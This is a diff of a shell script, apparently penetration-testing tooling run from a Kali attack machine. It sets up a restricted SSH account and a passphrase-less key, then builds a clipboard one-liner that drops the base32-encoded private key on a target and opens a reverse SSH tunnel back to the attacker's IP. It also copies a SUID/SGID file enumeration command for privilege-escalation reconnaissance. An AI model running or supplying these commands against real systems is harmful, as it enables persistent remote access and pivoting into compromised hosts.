@@ -21,16 +21,18 @@ echo 'echo "(s|g)uid files: \n$(find / -perm /6000 2>/dev/null)"' | xclip -selec
 grep -E 'limited-user' /etc/ssh/sshd_config || echo "Match User limited-user
    #AllowTcpForwarding yes
    X11Forwarding no
+   #PermitTTY no
    #PermitTunnel no
    #GatewayPorts no
    AllowAgentForwarding no
    #PermitOpen localhost:62222
    ForceCommand echo 'This account can only be used for [reason]'";
 usermod --shell /bin/bash limited-user
-sudo -u limited-user ssh-keygen
-usermod --shell /bin/false limited-user
-export LIMITED_USER_ID_RSA_BASE32=$(cat /home/limited-user/.ssh/id_rsa | base32)
-echo "echo '$LIMITED_USER_ID_RSA_BASE32' > /tmp/id_rsa;chmod 600 /tmp/id_rsa
-ssh -i /tmp/id_rsa -N -R <kali_port>:localhost:<remote_port> limited-user@<IP>" | xclip -selection clipboard
-
+rm -r /home/limited-user/.ssh 2>/dev/null
+sudo -u limited-user mkdir -p /home/limited-user/.ssh
+sudo -u limited-user ssh-keygen -t rsa -q -N "" -f "/home/limited-user/.ssh/id_rsa"
+cp /home/limited-user/.ssh/id_rsa /home/limited-user/.ssh/authorized_keys
+#usermod --shell /bin/false limited-user
+export LIMITED_USER_ID_RSA_BASE32=$(cat /home/limited-user/.ssh/id_rsa | base32 -w 0)
+echo "echo '$(echo $LIMITED_USER_ID_RSA_BASE32)' > /tmp/id_rsa_LIMITED_USER_ID;chmod 600 /tmp/id_rsa_LIMITED_USER_ID; ssh -i /tmp/id_rsa_LIMITED_USER_ID -N -R <kali_port>:localhost:<remote_port> limited-user@<IP>" | xclip -selection clipboard
 
